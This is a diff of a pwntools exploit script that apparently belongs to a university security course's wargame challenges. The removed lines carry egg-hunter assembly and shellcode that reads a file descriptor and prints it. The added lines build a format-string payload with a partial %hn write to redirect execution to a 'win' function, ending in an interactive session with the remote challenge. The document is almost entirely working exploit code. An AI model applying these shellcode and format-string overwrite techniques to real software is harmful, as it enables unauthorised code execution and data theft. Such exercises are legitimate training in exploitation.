@@ -6,11 +6,11 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 context.update(arch='i386')
-exe = './find-me' #Change this
+exe = './abs' #Change this
 
 PROGNAME = exe
 REMOTE = "comp6447.wtf" #Change this
-REMOTEPORT = 24973 #Change this
+REMOTEPORT = 29694 #Change this
 global p
 global e
 global global_timeout
@@ -47,54 +47,37 @@ else:
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
-# The first four instructions are equivalent to 0x4f904790.
-# This is our egg.
+win = p32(0x80491d6)
+index = 123*24
+address = p32(0x804c1c0)
+# GOT @ %50x @ 804c000
+# main @ %55x 
+payload = b'127'
+#partial_win = 0x91d6-len(payload)
+#payload += f'%{partial_win}x%55$hn'.encode()
+#payload += cyclic(3000)
+#eax_offset = cyclic_find("abdk")
+# eax @ dnab
+#eax_offset = cyclic_find("dnab")
 
-# Egg hunter
-small_assembly = """
-_start:
-mov edx, 0x4f904790
-loop:
-inc eax
-cmp dword ptr [eax], edx
-jne loop
-jmp eax
-"""
-
-# Egg + Shellcode
-large_assembly = """
-nop
-inc edi
-nop
-dec edi
-
-xor ecx, ecx
-mul ecx
-
-sub esp, 400
-mov ecx, esp
-mov ebx, 1000
-mov eax, 0x3
-mov edx, 0xFF
-int 0x80
-
-mov eax, 0x4
-mov ebx, 0x1
-int 0x80
-
-mov eax, 0x1
-int 0x80
-"""
-
-
-
-small_asm = asm(small_assembly)
-large_asm = asm(large_assembly)
-
-p.recvuntil(b'smallbuf shellcode', drop=True)
-p.sendline(small_asm)
-p.recvuntil(b'bigbuf shellcode:', drop=True)
-p.sendline(large_asm)
+#log.info(f"eax change at input: {eax_offset}")
+#index_offset = index - len(payload)
+#payload += fit({
+#    3: b"%x "*950,
+#    eax_offset: address,
+#    index_offset: win*6
+#})
+#=======================================
+partial_overwrite = 0x91d6 - len(payload)
+payload += f"%{partial_overwrite}x%1$hn".encode()
+offset = index - len(payload)
+payload += fit({
+    0: b"%x "*100,
+    offset: address,
+    offset + 4: 0x804c020
+})
+p.recvuntil(b"[0-3]: ", drop=True)
+p.sendline(payload)
 
 p.interactive()
 
